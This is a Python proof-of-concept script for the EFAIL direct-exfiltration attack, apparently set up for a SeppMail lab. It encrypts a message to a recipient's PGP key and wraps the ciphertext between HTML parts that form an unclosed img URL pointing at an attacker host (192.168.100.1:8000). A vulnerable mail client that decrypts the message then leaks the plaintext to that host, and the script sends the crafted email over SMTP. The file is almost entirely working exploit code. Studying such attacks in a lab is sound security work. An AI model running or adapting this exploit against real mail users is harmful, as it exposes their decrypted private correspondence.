#!/usr/bin/env -S uv run
# /// script
# requires-python = ">=3.10"
# dependencies = [
#   "pgpy",
#   "standard-imghdr",
# ]
# ///
"""
EFAIL direct-exfiltration PoC for OpenPGP: a vulnerable client stitches the
decrypted PLAINTEXT into an <img> URL and leaks it to ATTACKER_URL.

Edit ATTACKER_URL / PLAINTEXT / SUBJECT below if needed, then run:
  ./efail-direct-pgp.py
"""

from __future__ import annotations

import re
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pathlib import Path

import pgpy

# Attacker-controlled base URL; decrypted plaintext becomes the next path segment.
ATTACKER_URL = "http://192.168.100.1:8000"

# --- SeppMail lab (aligned with separator.py) ---
SMTP_HOST = "192.168.100.2"
SMTP_PORT = 25
SENDER = "efail-direct@external.test"
SUBJECT = "EFAIL: PGP direct variant"
PLAINTEXT = "Hello from pgpy (direct exfil lab)"

SCRIPT_DIR = Path(__file__).resolve().parent
PUBKEY_PATH = SCRIPT_DIR / "pk.asc"
RECIPIENT_FALLBACK = "pgp1@internal.test"


def load_public_key(key_path: Path) -> pgpy.PGPKey:
    key_data = key_path.read_text(encoding="utf-8")
    key, _ = pgpy.PGPKey.from_blob(key_data)

    if key.is_public is False:
        raise ValueError(f"Expected a public key at {key_path}, got private key material")

    return key


def recipient_email_from_key(public_key: pgpy.PGPKey) -> str:
    """Resolve envelope/header recipient from the key's primary user ID (owner)."""
    for uid in public_key.userids:
        email = getattr(uid, "email", None)
        if email:
            return str(email).strip()
    for uid in public_key.userids:
        text = uid.userid
        m = re.search(r"<\s*([^>\s]+)\s*>", text)
        if m:
            return m.group(1).strip()
    raise ValueError(
        f"No email found in user IDs of {PUBKEY_PATH}; add a UID with an email to the key."
    )


def resolve_recipient(public_key: pgpy.PGPKey) -> str:
    try:
        return recipient_email_from_key(public_key)
    except ValueError:
        return RECIPIENT_FALLBACK


def encrypt_pgp_binary(recipient_pubkey: pgpy.PGPKey, plaintext: str) -> bytes:
    """Encrypt to OpenPGP binary message (RFC 4880 packet stream) for PGP/MIME octet-stream."""
    pgp_message = pgpy.PGPMessage.new(plaintext, cleartext=False)
    encrypted = recipient_pubkey.encrypt(pgp_message)
    return str(encrypted)


def build_email(
    sender: str,
    recipient: str,
    subject: str,
    encrypted_payload: bytes,
) -> MIMEMultipart:
    """Build multipart/mixed EFAIL direct exfiltration (plaintext HTML | PGP/MIME | plaintext HTML)."""
    msg = MIMEMultipart("mixed")
    msg["From"] = sender
    msg["To"] = recipient
    msg["Subject"] = subject

    # (1) Plaintext HTML: unclosed src= — decrypted middle will become the URL path.
    opener = MIMEText(f'<img src="{ATTACKER_URL}/', "html", "us-ascii")
    msg.attach(opener)

    # (2) RFC 3156 multipart/encrypted — what MUAs actually treat as “the encrypted part”.
    msg.attach(MIMEText(encrypted_payload, "html", "us-ascii"))

    # (3) Plaintext HTML: close the quoted attribute (and the img tag).
    closer = MIMEText('">', "html", "us-ascii")
    msg.attach(closer)

    return msg


def send_mail(host: str, port: int, msg: MIMEMultipart) -> None:
    with smtplib.SMTP(host, port, timeout=30) as smtp:
        smtp.send_message(msg)


def main() -> None:
    public_key = load_public_key(PUBKEY_PATH)
    recipient = resolve_recipient(public_key)
    encrypted_payload = encrypt_pgp_binary(public_key, PLAINTEXT)
    email_message = build_email(SENDER, recipient, SUBJECT, encrypted_payload)
    print(email_message.as_string())
    send_mail(SMTP_HOST, SMTP_PORT, email_message)

    print(
        f"EFAIL direct exfiltration message sent from {SENDER} to {recipient} "
        f"via {SMTP_HOST}:{SMTP_PORT}"
    )


if __name__ == "__main__":
    main()
